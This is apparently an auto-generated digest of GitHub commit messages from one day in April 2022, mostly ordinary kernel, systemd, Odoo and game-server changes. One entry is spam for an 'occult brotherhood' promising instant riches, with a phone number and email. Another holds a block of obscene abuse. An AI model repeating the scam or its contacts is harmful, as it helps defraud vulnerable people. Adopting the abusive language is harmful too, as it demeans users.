## *good gosh*

It's so many stuff on **github**! Here's one more attempt to *get a grip*. And
an [index](docs/messages.md).

---

# [2022-04-13](docs/good-messages/2022/2022-04-13.md)


1,834,651 events recorded by [gharchive.org](https://www.gharchive.org/) of which 1,834,651 were push events containing 2,937,801 commit messages that amount to 210,773,645 characters filtered with [words.py@e23d022007...](https://github.com/defgsus/good-github/blob/e23d022007992279f9bcb3a9fd40126629d787e2/src/words.py) to these 36 messages:


## [treckstar/yolo-octo-hipster](https://github.com/treckstar/yolo-octo-hipster)@[ad697261bf...](https://github.com/treckstar/yolo-octo-hipster/commit/ad697261bf11001e98f989ea4b6f6e3621a75120)
#### Wednesday 2022-04-13 00:22:03 by treckstar

People listen up don't stand so close, I got somethin that you all should know. Holy matrimony is not for me, I'd rather die alone in misery.

---
## [maxspells/tgstation](https://github.com/maxspells/tgstation)@[ac21ef9078...](https://github.com/maxspells/tgstation/commit/ac21ef9078d88f51a4e198e394ed56e3cc731b45)
#### Wednesday 2022-04-13 01:48:14 by Pickle-Coding

No, we don't want radiation getting released in large pipenets fuck you fuckr uyu! (#65212)

* Make it harder to release radiation in large pipenets. Squares the volume / 2,500 thingy, and adds the requirements to the proto-nitrate bz response and proto-nitrate tritium response gas reactions to release radiation. This will make it significantly harder to release radiation in large pipenets, because releasing radiation in large pipenets makes it harder for people to identify the cause on why they are getting irradiated, which is bad and goes against the modern radiation goals.

Squaring is not enough for deranged people that know we don't want radiation released in large pipenets. Cubes the requirement instead. If someone could get enough gases reacting at once after this, then there is a bigger problem with atmos.

Who had fun seeing everything green, then getting irradiated and not even knowing why? I don't know, because I don't know who put the gases in waste and why we must suffer.

---
## [ryujinxed/kernel_realme_RMX2020](https://github.com/ryujinxed/kernel_realme_RMX2020)@[0f8f7ace40...](https://github.com/ryujinxed/kernel_realme_RMX2020/commit/0f8f7ace40d9b634b357f8b77debb423f9e977b1)
#### Wednesday 2022-04-13 02:44:14 by Peter Zijlstra

sched/core: Fix ttwu() race

Paul reported rcutorture occasionally hitting a NULL deref:

  sched_ttwu_pending()
    ttwu_do_wakeup()
      check_preempt_curr() := check_preempt_wakeup()
        find_matching_se()
          is_same_group()
            if (se->cfs_rq == pse->cfs_rq) <-- *BOOM*

Debugging showed that this only appears to happen when we take the new
code-path from commit:

  2ebb17717550 ("sched/core: Offload wakee task activation if it the wakee is descheduling")

and only when @cpu == smp_processor_id(). Something which should not
be possible, because p->on_cpu can only be true for remote tasks.
Similarly, without the new code-path from commit:

  c6e7bd7afaeb ("sched/core: Optimize ttwu() spinning on p->on_cpu")

this would've unconditionally hit:

  smp_cond_load_acquire(&p->on_cpu, !VAL);

and if: 'cpu == smp_processor_id() && p->on_cpu' is possible, this
would result in an instant live-lock (with IRQs disabled), something
that hasn't been reported.

The NULL deref can be explained however if the task_cpu(p) load at the
beginning of try_to_wake_up() returns an old value, and this old value
happens to be smp_processor_id(). Further assume that the p->on_cpu
load accurately returns 1, it really is still running, just not here.

Then, when we enqueue the task locally, we can crash in exactly the
observed manner because p->se.cfs_rq != rq->cfs_rq, because p's cfs_rq
is from the wrong CPU, therefore we'll iterate into the non-existant
parents and NULL deref.

The closest semi-plausible scenario I've managed to contrive is
somewhat elaborate (then again, actual reproduction takes many CPU
hours of rcutorture, so it can't be anything obvious):

					X->cpu = 1
					rq(1)->curr = X

	CPU0				CPU1				CPU2

					// switch away from X
					LOCK rq(1)->lock
					smp_mb__after_spinlock
					dequeue_task(X)
					  X->on_rq = 9
					switch_to(Z)
					  X->on_cpu = 0
					UNLOCK rq(1)->lock

									// migrate X to cpu 0
									LOCK rq(1)->lock
									dequeue_task(X)
									set_task_cpu(X, 0)
									  X->cpu = 0
									UNLOCK rq(1)->lock

									LOCK rq(0)->lock
									enqueue_task(X)
									  X->on_rq = 1
									UNLOCK rq(0)->lock

	// switch to X
	LOCK rq(0)->lock
	smp_mb__after_spinlock
	switch_to(X)
	  X->on_cpu = 1
	UNLOCK rq(0)->lock

	// X goes sleep
	X->state = TASK_UNINTERRUPTIBLE
	smp_mb();			// wake X
					ttwu()
					  LOCK X->pi_lock
					  smp_mb__after_spinlock

					  if (p->state)

					  cpu = X->cpu; // =? 1

					  smp_rmb()

	// X calls schedule()
	LOCK rq(0)->lock
	smp_mb__after_spinlock
	dequeue_task(X)
	  X->on_rq = 0

					  if (p->on_rq)

					  smp_rmb();

					  if (p->on_cpu && ttwu_queue_wakelist(..)) [*]

					  smp_cond_load_acquire(&p->on_cpu, !VAL)

					  cpu = select_task_rq(X, X->wake_cpu, ...)
					  if (X->cpu != cpu)
	switch_to(Y)
	  X->on_cpu = 0
	UNLOCK rq(0)->lock

However I'm having trouble convincing myself that's actually possible
on x86_64 -- after all, every LOCK implies an smp_mb() there, so if ttwu
observes ->state != RUNNING, it must also observe ->cpu != 1.

(Most of the previous ttwu() races were found on very large PowerPC)

Nevertheless, this fully explains the observed failure case.

Fix it by ordering the task_cpu(p) load after the p->on_cpu load,
which is easy since nothing actually uses @cpu before this.

Fixes: c6e7bd7afaeb ("sched/core: Optimize ttwu() spinning on p->on_cpu")
Reported-by: Paul E. McKenney <paulmck@kernel.org>
Tested-by: Paul E. McKenney <paulmck@kernel.org>
Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org>
Signed-off-by: Ingo Molnar <mingo@kernel.org>
Link: https://lkml.kernel.org/r/20200622125649.GC576871@hirez.programming.kicks-ass.net

---
## [iantine/Paradise](https://github.com/iantine/Paradise)@[6082c95eb3...](https://github.com/iantine/Paradise/commit/6082c95eb300a9f05b5422060db79f55fe91b9b3)
#### Wednesday 2022-04-13 03:42:10 by LightFire53

Relocates The Entertainment Offices and Custodial Closet on DeltaStation (#17480)

* Location, Location, Location!

* Lights and Pipes

I am so sorry for how hacky that disposal piping is

* TFW Disposals

* Oh god, what if there is a fire?!

* And a light switch...

Maybe the final commit? Taking bets on if I managed to forget something else

* If you bet on the requests console

You would be right.

* Bigger, Better, Janitor

* Bloody requests console...

---
## [pariahstation/Pariah-Station](https://github.com/pariahstation/Pariah-Station)@[be2be2d557...](https://github.com/pariahstation/Pariah-Station/commit/be2be2d557f25b84bb20e0e09773cfb55686da92)
#### Wednesday 2022-04-13 04:03:15 by Gallyus

Completely fixes Default input (shiptest-ss13/Shiptest#508) (#373)

* Completely fixes Default input (#508)

* Completely fixes Default input.

* Adds the RHK safety key back.

* Apply suggestions from code review

Co-authored-by: Mark Suckerberg <29362068+MarkSuckerberg@users.noreply.github.com>

* src>usr

* Snip some bee specific code.

Co-authored-by: Mark Suckerberg <29362068+MarkSuckerberg@users.noreply.github.com>

* TEEGEEEE
FUCK YOUR CUNT YOU SHIT EATING COCKSTORM AND EAT A DONG FUCKING ASS RAMMING SHIT FUCK EAT PENISES IN YOUR FUCK FACE AND SHIT OUT ABORTIONS OF FUCK AND POO AND SHIT IN YOUR ASS YOU COCK FUCK SHIT MONKEY FUCK ASS WANKER FROM THE DEPTHS OF SHIT

* cum zone

Co-authored-by: Mark Suckerberg <29362068+MarkSuckerberg@users.noreply.github.com>

---
## [qbcore-framework/qb-vehiclekeys](https://github.com/qbcore-framework/qb-vehiclekeys)@[757fdd0859...](https://github.com/qbcore-framework/qb-vehiclekeys/commit/757fdd0859013e45f9d432fa894f0ecb03d8bbf5)
#### Wednesday 2022-04-13 04:59:29 by ItsANoBrainer

Proper Refactor

Refactored the entire resource because the key system was not working.

No longer does a server callback 10 or so times a second, on top of other bad practices.

Tested pretty much everything with my devs, but there might be some weird issues we havnt found. Please lookover as I've been going crazy with the small tedious issues I've come across doing this.

Throwing this up to get feedback, and for people to use who want it.

Features:

- Keys are saved server side, and sent to each client when they are added or removed, as well as on character selection. This allows characters to leave and come back in the same server uptime session and still have the same keys
- Keys are only pulled from the server once on character load
- Giving keys has 3 types, /givekeys with an id will attempt to give keys you have to an id, not including an id will try to give it to the closest person, and if you're in a vehicle it will give to everyone
- Can only give keys to vehicles you have keys to
- Server event to force acquire keys to a plate for a person (for lockpicking/stealing/spawning, etc.)
- Can Carjack an NPC with a gun, has different percentages to work based on weapon (config)
- Take keys from dead npc drivers
- Can lockpick a car to unlock the doors
- Can hotwire a car if you're in the driver seat of the vehicle you dont have keys to to get keys
- Keeps the engine of a vehicle off if you dont have keys to it (allows other resources to attempt to toggle car engine without needing to interface if you have keys or not)
- Vehicle blacklist system for vehicles you dont want to be lockable (always unlocked)
- Police Alerts from lockpicking/hotwiring/carjacking
- Export to check if you have keys to a vehicle
- Locking/unlocking with hotkey
- Locking/unlocking and giving keys uses a custom GetVehicleInDirection you are facing for realism/accuracy
- Fully compatible with old resource. Has an event handler for 'vehiclekeys:client:SetOwner' in which it gives keys for that plate
- Some other shit I probably forgot

TODO:
- Add LOCALE support
- Stop peds from wanting to get back into the vehicle they just got carjacked out of as they're fleeing

---
## [joseph-flinn/workflow-tools](https://github.com/joseph-flinn/workflow-tools)@[4dddd50d09...](https://github.com/joseph-flinn/workflow-tools/commit/4dddd50d09dbfa96b5cdbbabca9e73f889f19bbb)
#### Wednesday 2022-04-13 05:19:13 by Joseph Flinn

Installing f.lux for later night work (it's fucking amazing)

---
## [lgritz/oiio](https://github.com/lgritz/oiio)@[4e985f6347...](https://github.com/lgritz/oiio/commit/4e985f63474e21298974a3f96536597a7306e199)
#### Wednesday 2022-04-13 06:58:58 by Larry Gritz

Lay groundwork for unity builds (#3381)

As I learned recently, a "unity" (aka "jumbo") build is where multiple
.cpp files are combined into one translation unit -- imagine a unity.cpp
that simply has

    #include "file1.cpp"
    #include "file2.cpp"
    ...
    #include "fileN.cpp"

and so you compile unity.cpp instead of the separate file?.cpp files
individually.

Turns out that CMake understands this concept and can do it for you
automatically!

The benefit of a unity build is that file1...fileN probably include
most of the same headers, expand the same templates, etc., so a bunch
of the per-file work of the compiler can be done once rather than
redundantly for each file.

There are two potential downsides, however:

1. It may not be safe to concatenate your cpp files! For example, if
   both file1.cpp and file2.cpp each contain a `static int foo;`, that
   may have been safe when compiled separately, but is not allowed to
   happen twice in one compilation unit. Similarly, if you have headers
   that don't have proper guards against multiple includes, etc. So one
   should expect a whole lot of little fix-ups are needed for this to
   work properly. (We'll come back to that topic.)

2. Combining source file into these "jumbo" modules can make heavily
   parallelized builds on many-core machine not be able to load balance
   or keep all the cores busy. (Simplified examples: if you have 16 .cpp
   files on a 16 core machine, each core can compile one cpp file in
   parallel with the others. But if you mash the modules into just one
   huge cpp file, give that to one core, and your other 15 cores are
   idle, so the full build probably takes much longer.)

I tried this out, including the many fixups implied by (1) above, and
at first the unity builds were slower on both my laptop (8 cores) and
workstation at work (32 cores), because of downside (2) explained
earlier -- harder to take advantage of parallel builds when there are
fewer, bigger, compilation units. Some tweaking of strategy got me to
the point where I could always get the unity builds to go faster, but
not by a whole lot when many core were available. Slighty faster, but
not worth the trouble. A bit disappointing, nearly abandoned the whole
idea.

HOWEVER, in situation where you are limited to very few cores (like in our
CI, which allocates 2 cores, and it sure seems more like 1-1.5 for the
Windows and Mac CI runners), the unity builds are substantially faster --
there's already not much parallelism to exploit, so you come out ahead
with the savings of that redundant per-file work we talked about.

So my current thinking is to go ahead and make the changes that allow
unity builds. I don't particularly recommend them when highly parallel
builds are available to you, but it might help to cut our CI
turnaround time down on the GitHub runners. And maybe it will help in
other situations for other people.

Ok, then. The present patch introduces these concepts and makes the
CMake and other build system changes to allow unity builds. (N.B. It
won't WORK yet, so don't try it!) After we get that out of the way, in
subsequent PRs I'll show all the changs to the code that were
necessary to fix all the little things that went wrong when source
files got combined.

---
## [odoo-dev/odoo](https://github.com/odoo-dev/odoo)@[cbc9279eaa...](https://github.com/odoo-dev/odoo/commit/cbc9279eaa169e65aeb2dab6dd36e3ffab4e481e)
#### Wednesday 2022-04-13 07:37:27 by Odoo's Mergebot

[MERGE] im_livechat: introduce chatbot scripts

PURPOSE

This commit introduces a chatbot operator that works based on a user-defined
script with various steps.

SPECS

A im_livechat.chatbot.script can be defined on a livechat rule.
When a end-user reaches a website page that matches the rule, the chat window
opens and the script of the bot starts iterating through its steps.

The chatbot code is currently directly integrated with the existing livechat
Javascript code.
It defines extra conditions and layout elements to be able to automate the
conversation and register user answers.

AVAILABLE STEPS

A script is defined with several steps that can currently be one of the
following types:

"text"

A simple text step where the bot posts a message without expecting an answer
e.g: "Hello! I'm a friendly robot!"

"question_selection"

The bot will ask a question and suggest answers, the end-user will have to
click on the answer he chooses
e.g: "How can I help you?
  -> Create a Ticket
  -> Create a Lead
  -> Speak with a human"

"question_email"

That step will ask the end user's email address (and validate it)
The result is saved on the linked im_livechat.im_livechatchatbot.mail.message

"question_phone"

Same logic as the 'question_email' for a phone number
We don't validate the input this time as it's a complicated process
(requires country, ...)

"forward_operator"

Special type of step that will add a human operator to the conversation when
reached, which stops the script and allow the visitor to discuss with a
real person.

The operator will be chosen among the available operators on the
livechat.channel.

If there is no operator available, the script continues normally which allows
to automate an "answering machine" that will redirect the user in case no
operator is available.

e.g: "I'm sorry, no operator is available right now, please contact us by email
at 'info@company.com', we will try to respond as soon as possible!".
(Or even something more complex with multiple questions / paths).

"free_input_single"

Will ask the visitor for a single line of text.
This text is not saved anywhere else than in the conversation, but it's still
useful when combined with steps that create leads / tickets since those print
the whole conversation into the description.

"free_input_multi"

Same as "free_input_single" but lets the user input multiple lines of text.
The frontend implementation is made by waiting a few seconds (currently 10) for
either the next submitted message or the next character typed into the input.

This lets visitors explain their issue / question with multiple messages.
Which is very useful since new messages are sent every time you press "Enter".

"create_lead"

Special step_type that allows creating a crm.lead when reaching it.
Usually used in addition to 'question_email' and 'question_phone' to create
interesting leads.

LINKS

Task-2030386

closes odoo/odoo#84000

Related: odoo/enterprise#24894
Signed-off-by: Thibault Delavallee (tde) <tde@openerp.com>
Co-authored-by: Patrick Hoste <pko@odoo.com>
Co-authored-by: Aurélien Warnon <awa@odoo.com>

---
## [Nanhumly/kernel_xiaomi_msm8998](https://github.com/Nanhumly/kernel_xiaomi_msm8998)@[4dff3e960a...](https://github.com/Nanhumly/kernel_xiaomi_msm8998/commit/4dff3e960a7475336bedce03ea134077c3cf2eaa)
#### Wednesday 2022-04-13 08:05:36 by Maciej Żenczykowski

FROMGIT: bpf: Do not change gso_size during bpf_skb_change_proto()

This is technically a backwards incompatible change in behaviour, but I'm
going to argue that it is very unlikely to break things, and likely to fix
*far* more then it breaks.

In no particular order, various reasons follow:

(a) I've long had a bug assigned to myself to debug a super rare kernel crash
on Android Pixel phones which can (per stacktrace) be traced back to BPF clat
IPv6 to IPv4 protocol conversion causing some sort of ugly failure much later
on during transmit deep in the GSO engine, AFAICT precisely because of this
change to gso_size, though I've never been able to manually reproduce it. I
believe it may be related to the particular network offload support of attached
USB ethernet dongle being used for tethering off of an IPv6-only cellular
connection. The reason might be we end up with more segments than max permitted,
or with a GSO packet with only one segment... (either way we break some
assumption and hit a BUG_ON)

(b) There is no check that the gso_size is > 20 when reducing it by 20, so we
might end up with a negative (or underflowing) gso_size or a gso_size of 0.
This can't possibly be good. Indeed this is probably somehow exploitable (or
at least can result in a kernel crash) by delivering crafted packets and perhaps
triggering an infinite loop or a divide by zero... As a reminder: gso_size (MSS)
is related to MTU, but not directly derived from it: gso_size/MSS may be
significantly smaller then one would get by deriving from local MTU. And on
some NICs (which do loose MTU checking on receive, it may even potentially be
larger, for example my work pc with 1500 MTU can receive 1520 byte frames [and
sometimes does due to bugs in a vendor plat46 implementation]). Indeed even just
going from 21 to 1 is potentially problematic because it increases the number
of segments by a factor of 21 (think DoS, or some other crash due to too many
segments).

(c) It's always safe to not increase the gso_size, because it doesn't result in
the max packet size increasing.  So the skb_increase_gso_size() call was always
unnecessary for correctness (and outright undesirable, see later). As such the
only part which is potentially dangerous (ie. could cause backwards compatibility
issues) is the removal of the skb_decrease_gso_size() call.

(d) If the packets are ultimately destined to the local device, then there is
absolutely no benefit to playing around with gso_size. It only matters if the
packets will egress the device. ie. we're either forwarding, or transmitting
from the device.

(e) This logic only triggers for packets which are GSO. It does not trigger for
skbs which are not GSO. It will not convert a non-GSO MTU sized packet into a
GSO packet (and you don't even know what the MTU is, so you can't even fix it).
As such your transmit path must *already* be able to handle an MTU 20 bytes
larger then your receive path (for IPv4 to IPv6 translation) - and indeed 28
bytes larger due to IPv4 fragments. Thus removing the skb_decrease_gso_size()
call doesn't actually increase the size of the packets your transmit side must
be able to handle. ie. to handle non-GSO max-MTU packets, the IPv4/IPv6 device/
route MTUs must already be set correctly. Since for example with an IPv4 egress
MTU of 1500, IPv4 to IPv6 translation will already build 1520 byte IPv6 frames,
so you need a 1520 byte device MTU. This means if your IPv6 device's egress
MTU is 1280, your IPv4 route must be 1260 (and actually 1252, because of the
need to handle fragments). This is to handle normal non-GSO packets. Thus the
reduction is simply not needed for GSO packets, because when they're correctly
built, they will already be the right size.

(f) TSO/GSO should be able to exactly undo GRO: the number of packets (TCP
segments) should not be modified, so that TCP's MSS counting works correctly
(this matters for congestion control). If protocol conversion changes the
gso_size, then the number of TCP segments may increase or decrease. Packet loss
after protocol conversion can result in partial loss of MSS segments that the
sender sent. How's the sending TCP stack going to react to receiving ACKs/SACKs
in the middle of the segments it sent?

(g) skb_{decrease,increase}_gso_size() are already no-ops for GSO_BY_FRAGS
case (besides triggering WARN_ON_ONCE). This means you already cannot guarantee
that gso_size (and thus resulting packet MTU) is changed. ie. you must assume
it won't be changed.

(h) changing gso_size is outright buggy for UDP GSO packets, where framing
matters (I believe that's also the case for SCTP, but it's already excluded
by [g]).  So the only remaining case is TCP, which also doesn't want it
(see [f]).

(i) see also the reasoning on the previous attempt at fixing this
(commit fa7b83bf3b156c767f3e4a25bbf3817b08f3ff8e) which shows that the current
behaviour causes TCP packet loss:

  In the forwarding path GRO -> BPF 6 to 4 -> GSO for TCP traffic, the
  coalesced packet payload can be > MSS, but < MSS + 20.

  bpf_skb_proto_6_to_4() will upgrade the MSS and it can be > the payload
  length. After then tcp_gso_segment checks for the payload length if it
  is <= MSS. The condition is causing the packet to be dropped.

  tcp_gso_segment():
    [...]
    mss = skb_shinfo(skb)->gso_size;
    if (unlikely(skb->len <= mss)) goto out;
    [...]

Thus changing the gso_size is simply a very bad idea. Increasing is unnecessary
and buggy, and decreasing can go negative.

Fixes: 6578171a7ff0 ("bpf: add bpf_skb_change_proto helper")
Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>
Cc: Dongseok Yi <dseok.yi@samsung.com>
Cc: Willem de Bruijn <willemb@google.com>
Link: https://lore.kernel.org/bpf/CANP3RGfjLikQ6dg=YpBU0OeHvyv7JOki7CyOUS9modaXAi-9vQ@mail.gmail.com
Link: https://lore.kernel.org/bpf/20210617000953.2787453-2-zenczykowski@gmail.com

(cherry picked from commit 364745fbe981a4370f50274475da4675661104df https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf-next.git/commit/?id=364745fbe981a4370f50274475da4675661104df )
Test: builds, TreeHugger
Bug: 158835517
Bug: 188690383
Signed-off-by: Maciej Żenczykowski <maze@google.com>
Change-Id: I0ef3174cbd3caaa42d5779334a9c0bfdc9ab81f5

---
## [tomty89/systemd](https://github.com/tomty89/systemd)@[de90700f36...](https://github.com/tomty89/systemd/commit/de90700f36f2126528f7ce92df0b5b5d5e277558)
#### Wednesday 2022-04-13 09:18:20 by Lennart Poettering

pid1: set SYSTEMD_NSS_DYNAMIC_BYPASS=1 env var for dbus-daemon

There's currently a deadlock between PID 1 and dbus-daemon: in some
cases dbus-daemon will do NSS lookups (which are blocking) at the same
time PID 1 synchronously blocks on some call to dbus-daemon. Let's break
that by setting SYSTEMD_NSS_DYNAMIC_BYPASS=1 env var for dbus-daemon,
which will disable synchronously blocking varlink calls from nss-systemd
to PID 1.

In the long run we should fix this differently: remove all synchronous
calls to dbus-daemon from PID 1. This is not trivial however: so far we
had the rule that synchronous calls from PID 1 to the dbus broker are OK
as long as they only go to interfaces implemented by the broke itself
rather than services reachable through it. Given that the relationship
between PID 1 and dbus is kinda special anyway, this was considered
acceptable for the sake of simplicity, since we quite often need
metadata about bus peers from the broker, and the asynchronous logic
would substantially complicate even the simplest method handlers.

This mostly reworks the existing code that sets SYSTEMD_NSS_BYPASS_BUS=
(which is a similar hack to deal with deadlocks between nss-systemd and
dbus-daemon itself) to set SYSTEMD_NSS_DYNAMIC_BYPASS=1 instead. No code
was checking SYSTEMD_NSS_BYPASS_BUS= anymore anyway, and it used to
solve a similar problem, hence it's an obvious piece of code to rework
like this.

Issue originally tracked down by Lukas Märdian. This patch is inspired
and closely based on his patch:

       https://github.com/systemd/systemd/pull/22038

Fixes: #15316
Co-authored-by: Lukas Märdian <slyon@ubuntu.com>

---
## [benjaminhuth/acts](https://github.com/benjaminhuth/acts)@[6e1fd31474...](https://github.com/benjaminhuth/acts/commit/6e1fd314745ae31eaddd8db8f0454b88a9aa60fa)
#### Wednesday 2022-04-13 09:26:55 by Stephen Nicholas Swatman

feat: Implement a new orthogonal range search seed finder (#904)

As I said in #901, I have been playing around with seed finding a little bit lately. Last weekend, I mentioned an idea for a new (?) kind of seed finding algorithm based on range search datastructures, and this is the very, very first semi-working implementation of it, just before the weekend.

The idea behind this algorithm is relatively simple. In traditional seedfinding, we check a whole lot of candidate spacepoints to see whether they meet some condition. If you look at this differently, each spacepoint defines a volume in the z-r-φ space, which contains any spacepoints it can form a doublet with. What if we reversed this logic? What if we defined this volume first, and then just extract the spacepoints inside of that space? That way, we can vastly reduce the number of spacepoints we need to look at.

How do we do this quickly? With [_k_-d trees](https://en.wikipedia.org/wiki/K-d_tree). These data structures are cheap to build, and they give us very fast orthogonal range searches. In other words, we can very quickly look up which of our spacepoints lie within an axis-aligned orthognal n-dimensional hyperrectangle. In this case, which spacepoints lie within a z-r-φ box.

So, the core idea of this seedfinder is to define as many of our seedfinding constraints in orthogonal fashion. That way, we can make our candidate hyperrectangle smaller and smaller. The tighter the constraints we can place, the better. Then, we look up the relevant spacepoints, and we can avoid looking at any others. That also means this solution requires no binning whatsoever.

## Constraint conversion

Currently there are quite a few constraints in the code. Here is my status update on how well it is going to convert each of them. In some cases, we can define a weaker version of the constraints in orthogonal fashion. This is still very powerful, and it doesn't actually lose us any efficiency (because we can always check the tighter constraint in a non-orthogonal way later, not a problem)!

### Unary constraints

Currently, I am not aware of any unary constraints in the Acts seed finding code. That is to say, logic to determine whether a point is allowed to be a lower spacepoint. However, I have the following thoughts about introducing some:

* I believe the binning code does some kind of magic to determine whether a spacepoint can be a lower spacepoint. Since my solution doesn't use any binning, I don't have access to this just yet. However, if we can incorporate this logic it could be very powerful.
* Maximum single-point η: we currently have some checks in place to see if the pseudorapidity of particles is not too high. We could realistically use this maximum pseudorapidity, combined with the collision region range to constrain the bottom spacepoints.

### Binary constraints

These are the existing binary constraints on spacepoint duplets:

Constraint | Description | Orthogonalization
-|-|-
Minimum ∆r | Ensure that the second spacepoint is within a certain difference in radius | Full
Maximum cot θ | Ensure that the pseudorapidity of the duplet is not too high | Unsuccessful
z-origin range | Ensure that the duplet would have originated from the collision point | Weakened 
Maximum ∆φ<sup>1</sup> | Ensure that the duplet does not bend too much in the x-y plane | Full

<sup>1</sup> This check does not exist explicitly in the existing seed finder, but is implicit in the binning process.

### Ternary constraints

There are a lot of ternary constraints (to check whether a triplet is valid):

Constraint | Description | Orthogonalization
-|-|-
Scattering angle | ??? | Unsuccessful
Helix diameter | Ensure the helix diameter is within some range | In progress
Impact parameters | Ensure the impact parameters are close to the collision point | In progress
Monotonic z<sup>1</sup> | Ensure that z increases or decreases monotonically between points | Full

<sup>1</sup> This check does not exist in the existing seed finder, check #901.

There are also constraints defined in the experiment-specific cuts, and the seed filter, and in other places. If we could convert some of those to orthogonal constraints the implementation would become much more powerful. However, I don't really understand what is happening in those files just yet. Need more reading.

## Current performance

The current performance of this seedfinder is... Complicated. On my machine, it runs a 4000 π<sup>+</sup> event in about 5 seconds, three times slower than the existing seedfinder. Its efficiency is much higher though, and the fake rate is much lower. So that's something. However, that is in part because I am creating far more seed candidates, so take this with a big grain of salt.

## Potential gain

There are two ways that I can think of to use this kind of algorithm. The first is an inside-to-outside algorithm, where we pick a lower spacepoint first, check the space it defines for a middle spacepoint, and then check the space the two of them define for a third spacepoint. This algorithm has time complexity 𝒪(_n_<sup>3</sup>), and it has space complexity 𝒪(_n_). Due to the constants, I still believe this implementation can outperform the 𝒪(_n_<sup>2</sup>) existing algorithm, however.

The second way would be to construct a set of duplets using this logic, and then to fit those together like we do with traditional seedfinding. This has 𝒪(_n_<sup>2</sup>) time complexity like the existing code, but also space complexity 𝒪(_n_<sup>2</sup>).

## Things that are completed

* The implementation of the _k_-d tree seems to work very well, and it is quite fast.
* Basic seedfinding using this strategy is functional.

## Things that don't work yet

* My maximum ∆φ constraint does not cross the 2π boundary yet.
* I used the existing seedfinding algorithm as a stepping stone, which I have completely destroyed in the process. Obviously I do not intend on keeping it that way, and the existing algorithm will be restored to its full glory.
* Lots more.

## Things that can be improved

* Add more constraints, and tighten existing ones.
* Lots of things, pretty much everything. But I really want to go home for the weekend, so I will write this part next week.

---
## [PixelExperience-Devices/kernel_oneplus_sm8150](https://github.com/PixelExperience-Devices/kernel_oneplus_sm8150)@[126619b9d2...](https://github.com/PixelExperience-Devices/kernel_oneplus_sm8150/commit/126619b9d2a53ac34ad19bbe8bad4511bfe09098)
#### Wednesday 2022-04-13 10:51:52 by alk3pInjection

drm: Handle dim for udfps

* Apparently, los fod impl is better than udfps cuz it
  has onShow/HideFodView hook, which allows us to toggle
  dimlayer seamlessly.

  Since udfps only partially supports the former one,
  we'd better kill dim in kernel. This is kinda a hack
  but it works well, bringing perfect fod experience
  back to us.

Co-authored-by: Art_Chen <Chenxy0201@qq.com>
Signed-off-by: alk3pInjection <webmaster@raspii.tech>
Change-Id: I80bfd508dacac5db89f4fff0283529c256fb30ce

---
## [billonairesclub/billonairesclub](https://github.com/billonairesclub/billonairesclub)@[302daea058...](https://github.com/billonairesclub/billonairesclub/commit/302daea058abe8213182d58b244db380768ac9fe)
#### Wednesday 2022-04-13 11:05:21 by billonairesclub

how to join money rituals without human sacrifice call or whatsapp grand master +2348104462452

I WANT TO BELONG TO THE RICH AND WEALTHY OCCULT SOCIETY ONLINE TO BE RICH INSTANTLY IF EVERY WERE I GO CALL +2348104462452 I want to join occult of billionaires club brotherhood occult temple online billionaires club brotherhood occult.
DO YOU WANT TO JOIN OCCULT TO BE AMONG THE RICHEST MEN IN THE WORD.
THE billionaires club brotherhood occult.BASE ON ANIMAL SACRIFICE AND NO HUMAN BLOOD IS INVOLVE, JOIN US TODAY AND BE WEALTHY AND FAMOUS AND SHAKE HANDS WITH OUR LORD LUCIFER THE GODS OF WEALTH AND RICHES.
FOR MORE INFORMATION AND EQUIRIES CALL +2348104462452 OR EMAIL US AT : billonairesbrotherhoodclub@gmail.com

OUR MAIN AIM AND MISSION IS TO HELP ALL AFRICAN YOUTHS TO LIVE THE LIVES OF THEIR DREAMS.JOIN OUR OCCULT FOR WEALTH/MONEY, FAME, POWER, PROTECTION,INSTANT RICH CALL +2348104462452.
If you’ve had a hard life up until now– here is the opportunity to change it all. By simply allowing  billionaires club brotherhood occult to reshape your life, your dreams will indeed come true. Won’t you allow yourself to finally relax, enjoy life and leave the work to us? Don’t pass up the greatest opportunity you may ever be offered! billionaires Brotherhood is a club or organization whose activities and inner functioning are concealed from non-members.Peoples billionaires  Brotherhood is organized conspiracies working in secret to achieve a hidden agenda. Members use secrecy to protect themselves and their movement. Critics view as malevolent organizations working against the general will of mankind. ‘ Members may be required to conceal or deny their membership, and they are often sworn to hold the Peoples club secrets by an oath. Violating the oath may result in the application of severe sanctions. Like the most successful forgeries, the most effective Brotherhood are unknown beyond their adherents.
we are not suppose to be on the internet but because of this comments:
‘i want to join occult in nigeria’
‘i want to join real occult in ghana’
‘i want to join occult in africa to be rich’
‘i want to join good occult fraternity in nigeria’
‘i want to join great billionaires club brotherhood occultin in nigeria to be rich’
‘i want to join  billionaires club brotherhood occultin in nigeria/africa’ billionaires club brotherhood occult
‘i want to join billionaires club brotherhood occultin nigeria’
we are now here for you.
We have received several emails regarding our stories on the media about Peoples billionaires club brotherhood occult . Most have asked how they can join while others simply wanted to understand the phenomenon further. Today, we look at how to join this secret society. According to the rules and regulations on how to join The family, the promise of wealth, success, power and domination simply by joining billionaires club brotherhood occult  is heresy. Powerful, Influential, intelligent, entrepreneurial, successful and wealthy individuals make up the brotherhood order. In order to join the billionaires club brotherhood occult of fame and riches?CALL +2348104462452

---
## [axietheaxolotl/sojourn-station](https://github.com/axietheaxolotl/sojourn-station)@[83c7559f7c...](https://github.com/axietheaxolotl/sojourn-station/commit/83c7559f7c9d151b330239652f0b66ba3463584a)
#### Wednesday 2022-04-13 12:27:19 by WilliamNelson37

Fratellis and Co

Finishes the Fratellis

Removed Low level code that allowed staff to vore people (why the fuck)

Removed Low level code that allowed staff to regurgitate vored people (god's light has diminished)

---
## [ianjoneill/terminal](https://github.com/ianjoneill/terminal)@[446f280757...](https://github.com/ianjoneill/terminal/commit/446f2807573ffda411f548a519835d15cacdcd9b)
#### Wednesday 2022-04-13 12:30:20 by Mike Griese

Try to silently fall back to a local monarch (#12825)

This is a crazy idea Dustin and I had.

> we can't repro this at will. But we kinda have an idea of where the deref is. We don't know if the small patch (throw, and try again) will fix it. We're sure that the "just fall back to an isolated monarch" will work. I'd almost rather take a build testing the small patch first, to see if that works

> This might seem crazy
> in 1.12, isolated monarch. In 1.13, "small patch". In 1.14, we can wait and see

I can write more details in the morning. It's 5pm here so if we want this today, here it is.

@dhowett double check my velocity flag logic here. Should be always true for Release, and off for Dev, Preview. 

* [x] closes #12774

---
